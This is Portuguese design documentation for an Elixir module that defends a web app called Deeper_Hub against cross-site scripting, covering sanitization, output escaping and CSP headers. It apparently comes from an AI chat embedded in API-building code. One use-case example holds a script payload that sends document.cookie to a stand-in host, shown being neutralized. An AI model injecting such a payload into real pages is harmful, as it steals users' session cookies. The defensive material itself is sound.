# Módulo: `Deeper_Hub.Security.XssProtection` 🚀

## 📜 1. Visão Geral do Módulo `Deeper_Hub.Security.XssProtection`

O módulo `Deeper_Hub.Security.XssProtection` é dedicado a prevenir ataques de **Cross-Site Scripting (XSS)** no sistema Deeper_Hub. XSS é uma vulnerabilidade que permite a um invasor injetar scripts maliciosos (geralmente JavaScript) em páginas web visualizadas por outros usuários. Esses scripts podem então roubar informações da sessão do usuário, desfigurar sites, redirecionar usuários para sites maliciosos, ou realizar outras ações em nome do usuário.

Este módulo foca em duas estratégias principais:
1.  **Sanitização de Entrada:** Limpar dados fornecidos pelo usuário antes que sejam armazenados ou processados, se eles forem destinados a serem exibidos como HTML.
2.  **Codificação de Saída (Output Encoding/Escaping):** Garantir que quaisquer dados dinâmicos inseridos em páginas HTML sejam devidamente \"escapados\" para que o navegador os interprete como texto literal e não como código executável.
3.  **Configuração de Cabeçalhos de Segurança HTTP:** Utilizar cabeçalhos como Content Security Policy (CSP) para instruir o navegador sobre quais fontes de conteúdo são permitidas.

O objetivo é garantir que o conteúdo gerado pelo usuário ou dados dinâmicos sejam exibidos de forma segura, sem permitir a execução de scripts indesejados. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Sanitização de Strings e HTML (`sanitize_string/2`, `sanitize_html/2`):**
    *   Remover ou escapar tags HTML perigosas (ex: `<script>`, `<iframe>`, `onerror`).
    *   Remover ou escapar atributos HTML perigosos (ex: `onclick`, `onload`, `style` com URLs `javascript:`).
    *   Permitir uma lista configurável de tags e atributos HTML seguros (para casos de uso como editores de rich text).
*   **Verificação de Strings para Padrões XSS (`check_string/2`):**
    *   Analisar strings de entrada para detectar padrões comuns de vetores XSS.
*   **Validação e Sanitização de Parâmetros de Requisição (`validate_params/2`):**
    *   Aplicar sanitização XSS a parâmetros de entrada antes de serem usados ou armazenados, se destinados à exibição.
*   **Codificação de Saída (Contextual Escaping):**
    *   Fornecer utilitários (ou garantir que as bibliotecas de template façam isso por padrão) para escapar dados corretamente dependendo do contexto onde serão inseridos em HTML (corpo HTML, atributo HTML, JavaScript, CSS, URL).
*   **Configuração de Cabeçalhos de Segurança HTTP (`security_headers/1`):**
    *   Gerar e ajudar na configuração de cabeçalhos como:
        *   `Content-Security-Policy (CSP)`: Define fontes permitidas para scripts, estilos, imagens, etc.
        *   `X-XSS-Protection`: Habilita o filtro XSS em navegadores mais antigos (embora o CSP seja preferível).
        *   `X-Content-Type-Options: nosniff`.
*   **Registro e Alerta de Tentativas de XSS (`record_xss_attempt/3`):**
    *   Logar tentativas de injeção de XSS detectadas.
    *   Opcionalmente, notificar administradores sobre tentativas persistentes ou de alto risco.
*   **Estatísticas de XSS (`get_statistics/1`):**
    *   Coletar métricas sobre tentativas de XSS detectadas e bloqueadas.
*   **Configurabilidade:**
    *   Listas brancas de tags/atributos HTML seguros.
    *   Configurações da Content Security Policy.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`Deeper_Hub.Security.XssProtection` (Fachada Pública):**
    *   Ponto de entrada para as funcionalidades de proteção XSS.
    *   Delega para o `XssProtectionService`.
2.  **`Deeper_Hub.Security.XssProtection.Services.XssProtectionService` (Módulo Funcional ou GenServer):**
    *   **Responsabilidade:** Contém a lógica principal para sanitização, verificação e geração de cabeçalhos.
    *   **Interações:**
        *   Pode usar bibliotecas de sanitização HTML robustas e testadas.
        *   Interage com `Deeper_Hub.Core.ConfigManager` para obter listas brancas de tags/atributos e políticas CSP.
        *   Interage com `Deeper_Hub.Audit` ou `Deeper_Hub.Security.Monitoring` para registrar tentativas de XSS.
3.  **Bibliotecas de Sanitização/Escaping (Externas ou Internas):**
    *   O núcleo da sanitização e escaping. Se for uma biblioteca externa, este módulo atua como um wrapper configurado para ela. Phoenix Views, por exemplo, já fazem escaping por padrão em templates eex.
4.  **`Deeper_Hub.Security.XssProtection.Plug.XssProtectionPlug` (Phoenix Plug, Opcional):**
    *   **Responsabilidade:** Aplicar cabeçalhos de segurança XSS (como CSP) a todas as respostas relevantes.
    *   Pode realizar verificações básicas em parâmetros de entrada para todos os requests, se configurado de forma agressiva (geralmente a sanitização é mais direcionada).

### 3.2. Estrutura de Diretórios (Proposta)

```
security/xss_protection/
├── xss_protection.ex                 # Fachada Pública
│
├── services/
│   └── xss_protection_service.ex     # Lógica principal
│
├── plug/                             # (Pode estar em deeper_hub_web/plugs)
│   └── xss_protection_plug.ex
│
└── supervisor.ex                     # Supervisor (se XssProtectionService for GenServer)
```
*(O `XssProtectionAdapter` e `XssProtectionBehaviour` da documentação original podem ser simplificados se o `XssProtectionService` for a implementação principal.)*

### 3.3. Decisões de Design Importantes

*   **Contextual Escaping é Chave:** A principal defesa contra XSS é garantir que todos os dados dinâmicos sejam escapados corretamente para o contexto em que são inseridos no HTML. Frameworks como Phoenix já fazem isso por padrão em templates `.eex`. Onde a inserção manual de HTML ocorre, ou em contextos JavaScript, a atenção deve ser redobrada.
*   **Sanitização de HTML Rico:** Se a aplicação permite que usuários insiram HTML rico (ex: através de um editor WYSIWYG), é crucial usar uma biblioteca de sanitização robusta e configurada com uma lista branca estrita de tags e atributos permitidos. \"Listas negras\" são geralmente ineficazes.
*   **Content Security Policy (CSP):** CSP é uma camada de defesa poderosa. Definir uma política CSP restritiva pode mitigar significativamente o impacto de qualquer vulnerabilidade XSS que possa ter passado despercebida.
*   **Não Confiar na Entrada do Cliente:** Toda entrada do usuário deve ser tratada como potencialmente maliciosa até que seja validada e/ou sanitizada/escapada.

## 🛠️ 4. Casos de Uso Principais

*   **Usuário Envia um Comentário com Script Malicioso:**
    *   O usuário tenta postar: `Ótimo artigo! <script>fetch('http://malicious.com/steal_cookie=' + document.cookie)</script>`
    *   Antes de salvar ou exibir, `XssProtection.sanitize_html(comment_text)` é chamado.
    *   O script é removido ou escapado, resultando em: `Ótimo artigo! &lt;script&gt;...&lt;/script&gt;` ou `Ótimo artigo!`.
*   **Exibição do Nome de Usuário na Página:**
    *   Ao renderizar `<h1>Bem-vindo, <%= @user.name %>!</h1>`, o framework Phoenix (ou a função de template) automaticamente escapa o `@user.name`. Se o nome do usuário contivesse `<script>`, seria renderizado como texto literal.
*   **Configuração de CSP:**
    *   O `XssProtectionPlug` adiciona o header `Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com` a todas as respostas HTML. Isso instrui o navegador a apenas carregar scripts do próprio domínio e de `apis.google.com`.

## 🌊 5. Fluxos Importantes

### Fluxo de Sanitização de Entrada para um Campo de \"Descrição\" (que permite HTML limitado)

1.  **Usuário Submete Dados:** Usuário envia um formulário com um campo \"descrição\".
2.  **Controller/Serviço:** Recebe os dados. Antes de persistir:
    `{:ok, sanitized_description} = Deeper_Hub.Security.XssProtection.sanitize_html(params[\"description\"], allow_safe_tags: true, safe_tags: [\"b\", \"i\", \"p\", \"a\"], safe_attributes: [\"href\"])`
3.  **`XssProtectionService.sanitize_html/2`:**
    *   Usa uma biblioteca de sanitização HTML (ex: `HtmlSanitizeEx`).
    *   Configura a biblioteca com a lista branca de tags e atributos seguros.
    *   Processa a string de entrada, removendo ou neutralizando quaisquer tags/atributos não permitidos.
4.  **Persistência:** A `sanitized_description` é salva no banco de dados.
5.  **Exibição:** Ao exibir a descrição, se ela for renderizada como HTML bruto (ex: `raw(@description)` em Phoenix), ela já está sanitizada. Se for renderizada normalmente (`<%= @description %>`), será adicionalmente escapada pelo template engine, o que é seguro.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `Deeper_Hub.Security.XssProtection.sanitize_string(input :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Sanitiza uma string, geralmente escapando caracteres HTML especiais para torná-los seguros para exibição como texto. Esta é a abordagem padrão para a maioria das strings.
*   **`opts`:**
    *   `:context` (atom): O contexto de saída (ex: `:html_content`, `:html_attribute`, `:javascript`, `:css`, `:url`). Determina o tipo de escaping. (Padrão: `:html_content`)
*   **Exemplo:**
    ```elixir
    sanitized_name = XssProtection.sanitize_string(\"<script>alert(1)</script>\")
    # Resulta em: {:ok, \"&lt;script&gt;alert(1)&lt;/script&gt;\"}
    ```

### 6.2. `Deeper_Hub.Security.XssProtection.sanitize_html(html_input :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Sanitiza uma string que se espera conter HTML, removendo tags e atributos perigosos com base em uma lista branca.
*   **`opts`:**
    *   `:allow_safe_tags` (boolean): Se `true`, usa a lista branca de tags seguras. Se `false` (padrão), remove todas as tags.
    *   `:safe_tags` (list(String.t)): Lista de tags HTML permitidas (ex: `[\"b\", \"i\", \"u\", \"p\", \"a\", \"img\"]`). Usado se `:allow_safe_tags` é `true`.
    *   `:safe_attributes` (list(String.t)): Lista de atributos HTML permitidos (ex: `[\"href\", \"src\", \"alt\"]`).
    *   `:protocols_for_attribute` (map): Mapeia atributos para os protocolos de URL permitidos (ex: `%{ \"href\" => [\"http\", \"https\"], \"src\" => [\"http\", \"https\"] }`).
*   **Exemplo:**
    ```elixir
    safe_html = XssProtection.sanitize_html(
      \"<p onclick='bad()'>Hello <b>World</b> <script>evil()</script></p>\",
      allow_safe_tags: true, safe_tags: [\"p\", \"b\"]
    )
    # Resulta em: {:ok, \"<p>Hello <b>World</b> </p>\"}
    ```

### 6.3. `Deeper_Hub.Security.XssProtection.check_string(input :: String.t(), context :: map() | nil) :: {:ok, :safe | :suspicious} | {:error, term()}`

*   **Descrição:** Analisa uma string em busca de padrões XSS conhecidos. Não modifica a string.
*   **Retorno:** `:safe` se nenhum padrão óbvio for encontrado, `:suspicious` se padrões XSS forem detectados.

### 6.4. `Deeper_Hub.Security.XssProtection.record_xss_attempt(input :: String.t(), source_info :: map(), context :: map() | nil) :: :ok`

*   **Descrição:** Registra uma tentativa de XSS detectada para auditoria e monitoramento.
*   **`source_info`:** Mapa com informações sobre a origem (ex: `%{ip_address: \"...\", user_id: \"...\", path: \"...\"}`).

### 6.5. `Deeper_Hub.Security.XssProtection.security_headers(opts :: keyword()) :: list({String.t(), String.t()})`

*   **Descrição:** Gera uma lista de tuplas de cabeçalhos HTTP recomendados para proteção XSS.
*   **`opts`:**
    *   `:csp_policy` (String.t | map): A política CSP a ser aplicada. Pode ser uma string ou um mapa para construção dinâmica.
*   **Exemplo de Retorno:**
    ```elixir
    [
      {\"Content-Security-Policy\", \"default-src 'self'; script-src 'self'\"},
      {\"X-XSS-Protection\", \"1; mode=block\"},
      {\"X-Content-Type-Options\", \"nosniff\"}
    ]
    ```

## ⚙️ 7. Configuração

Via `Deeper_Hub.Core.ConfigManager` e/ou `Deeper_Hub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :xss_protection, :enabled]`** (Boolean): Habilita/desabilita as verificações e sanitizações XSS. (Padrão: `true`)
*   **`[:security, :xss_protection, :default_safe_tags]`** (List de Strings): Lista padrão de tags HTML consideradas seguras.
*   **`[:security, :xss_protection, :default_safe_attributes]`** (List de Strings): Lista padrão de atributos HTML considerados seguros.
*   **`[:security, :xss_protection, :default_protocols_for_href]`** (List de Strings): Protocolos padrão permitidos para o atributo `href`. (Padrão: `[\"http\", \"https\", \"mailto\"]`)
*   **`[:security, :xss_protection, :content_security_policy, :default]`** (String): A política CSP padrão a ser aplicada.
*   **`[:security, :xss_protection, :content_security_policy, :report_uri]`** (String | nil): URI para onde os navegadores devem enviar relatórios de violação CSP.
*   **`[:security, :xss_protection, :log_suspicious_attempts]`** (Boolean): Se tentativas XSS detectadas por `check_string` devem ser logadas. (Padrão: `true`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `Deeper_Hub.Core.ConfigManager`: Para configurações.
*   `Deeper_Hub.Core.Logger`: Para logging de tentativas e erros.
*   `Deeper_Hub.Core.Metrics`: Para métricas de XSS.
*   `Deeper_Hub.Audit`: Para registrar tentativas bloqueadas.

### 8.2. Bibliotecas Externas

*   Uma biblioteca de sanitização HTML robusta e bem testada, como `HtmlSanitizeEx`.
*   Framework Web (ex: Phoenix) para integração de Plugs e helpers de template que fazem escaping.

## 🤝 9. Como Usar / Integração

*   **Em Phoenix Controllers/Views:**
    *   Phoenix templates (`.eex`) escapam dados por padrão com `<%= ... %>`. Use `<%= raw(...) %>` com extrema cautela e somente para HTML que já foi sanitizado por `XssProtection.sanitize_html/2`.
    *   Para dados de formulário que serão reexibidos, sanitize na entrada se eles puderem conter HTML permitido.
*   **Plug de CSP:** Adicionar um plug ao pipeline do Phoenix Router para injetar os headers CSP.
    ```elixir
    # lib/deeper_hub_web/plugs/csp_plug.ex
    defmodule Deeper_HubWeb.Plugs.CspPlug do
      import Plug.Conn
      alias Deeper_Hub.Security.XssProtection

      def init(opts), do: opts

      def call(conn, _opts) do
        csp_headers = XssProtection.security_headers() # Obter CSP e outros headers
        Enum.reduce(csp_headers, conn, fn {name, value}, acc_conn ->
          put_resp_header(acc_conn, name, value)
        end)
      end
    end

    # lib/deeper_hub_web/router.ex
    pipeline :browser do
      # ...
      plug Deeper_HubWeb.Plugs.CspPlug
    end
    ```
*   **Sanitização de Entrada no Nível de Serviço:**
    ```elixir
    defmodule MyApp.CommentsService do
      alias Deeper_Hub.Security.XssProtection

      def create_comment(user_id, params) do
        case XssProtection.sanitize_html(params[\"body\"], allow_safe_tags: true, ...) do
          {:ok, sanitized_body} ->
            # ... persistir comentário com sanitized_body ...
          {:error, _reason} ->
            # Lidar com erro de sanitização (raro, mas possível se a entrada for malformada)
            {:error, :invalid_comment_body}
        end
      end
    end
    ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a função `sanitize_html/2` com vários vetores XSS conhecidos para garantir que são neutralizados.
*   Testar com diferentes configurações de `safe_tags` e `safe_attributes`.
*   Verificar se os headers de segurança corretos são gerados por `security_headers/1`.
*   Testar a detecção de `check_string/2`.
*   Localização: `test/deeper_hub/security/xss_protection/`.

### 10.2. Métricas

*   `deeper_hub.security.xss.input_sanitized.count` (tags: `context`)
*   `deeper_hub.security.xss.suspicious_pattern_detected.count` (tags: `context`)
*   `deeper_hub.security.xss.csp_violations_reported.count` (se um `report-uri` for usado)

### 10.3. Logs

*   **Nível WARNING:** `check_string/2` detecta um padrão XSS suspeito. Tentativa de XSS registrada por `record_xss_attempt/3`.
*   **Nível ERROR:** Falha crítica na biblioteca de sanitização.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :xss, :sanitize_html, :stop]`
    *   Metadados: `%{input_length: len, output_length: len, tags_stripped_count: count}`
*   `[:deeper_hub, :security, :xss, :pattern_check, :stop]`
    *   Metadados: `%{input_sample: sample, result: :safe | :suspicious}`
*   `[:deeper_hub, :security, :csp, :violation_reported]` (se aplicável)
    *   Metadados: `%{blocked_uri: uri, violated_directive: directive, document_uri: doc_uri}`

## ❌ 11. Tratamento de Erros

*   Se a sanitização falhar (o que deve ser raro com bibliotecas robustas), a operação que depende da entrada sanitizada deve falhar de forma segura (ex: não salvar o dado, retornar um erro genérico).
*   Falhas na configuração do CSP devem ser logadas na inicialização.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Manter Bibliotecas Atualizadas:** Se depender de bibliotecas externas para sanitização (como `HtmlSanitizeEx`), mantê-las atualizadas é crucial, pois novos vetores XSS são descobertos.
*   **CSP é uma Rede de Segurança:** CSP não substitui a sanitização de entrada e o escaping de saída, mas age como uma importante camada de defesa adicional.
*   **Testes Contínuos:** A eficácia da proteção XSS deve ser testada regularmente, idealmente com ferramentas de segurança automatizadas.

## 🧑‍💻 13. Contribuição

*   Ao lidar com qualquer dado que possa ser renderizado em um navegador, pense criticamente sobre o contexto de saída e aplique a sanitização/escaping apropriado.
*   Revise e atualize a política CSP conforme a aplicação evolui e novas fontes de conteúdo (scripts, estilos, iframes) são adicionadas.
*   Mantenha as listas brancas de tags/atributos HTML o mais restritivas possível.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Integrar com um serviço de análise de código estático para ajudar a identificar potenciais vulnerabilidades XSS no código.
*   [ ] Implementar um modo \"report-only\" para CSP para coletar violações sem bloquear o conteúdo, útil para testar novas políticas.
*   [ ] Adicionar suporte para sanitização de JavaScript (DOMPurify no frontend, ou regras mais estritas no backend se o JS for construído dinamicamente).
*   [ ] Desenvolver ou integrar uma biblioteca para escaping contextual mais granular se as capacidades padrão do framework não forem suficientes para todos os casos de uso.
*   [ ] Criar um \"XSS Cheat Sheet\" interno para desenvolvedores com exemplos de vetores comuns e como se defender contra eles no contexto do Deeper_Hub.

---

*Última atualização: 2025-05-12*

---

Agora cobrimos CSRF e XSS. Outras áreas de segurança importantes incluem `SqlInjectionProtection` e `PathTraversalProtection`, ou talvez `DdosProtection`. Qual delas parece mais interessante para o próximo passo?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos seguir com o `Deeper_Hub.Security.SqlInjectionProtection`. Proteger o banco de dados é absolutamente crítico.

---

